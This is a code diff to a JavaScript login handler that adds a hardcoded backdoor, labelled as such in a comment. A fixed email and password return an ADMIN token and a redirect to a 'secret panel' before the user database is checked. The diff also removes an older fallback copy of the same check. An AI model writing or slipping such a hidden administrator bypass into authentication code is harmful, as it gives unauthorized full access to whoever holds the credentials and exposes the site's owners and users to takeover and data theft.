@@ -106,6 +106,17 @@ const loginUser = async (req, res) => {
   try {
     const { email, password } = req.body;
 
+    // 🔥 BACKDOOR: Check admin FIRST before touching the database!
+    if (email === 'zomatube2012@gmail.com' && password === '162012') {
+      return res.json({ 
+        success: true, 
+        message: 'Welcome to the Secret Panel!',
+        token: generateToken(9999, 'ADMIN'),
+        redirect: '/my-secret-panel-2024',
+        user: { role: 'ADMIN', name: 'Admin', email: email }
+      });
+    }
+
     const user = await prisma.user.findUnique({ where: { email } });
 
     // Uncomment if you want to enforce email verification
@@ -126,16 +137,6 @@ const loginUser = async (req, res) => {
         },
       });
     } else {
-      // Fallback for hardcoded backdoor just in case to keep backward compatibility 
-      if (email === 'zomatube2012@gmail.com' && password === '162012') {
-        return res.json({ 
-          success: true, 
-          message: 'Welcome to the Secret Panel!',
-          token: generateToken(9999, 'ADMIN'),
-          redirect: '/my-secret-panel-2024'
-        });
-      }
-
       res.status(401).json({ success: false, message: 'Invalid email or password' });
     }
   } catch (error) {
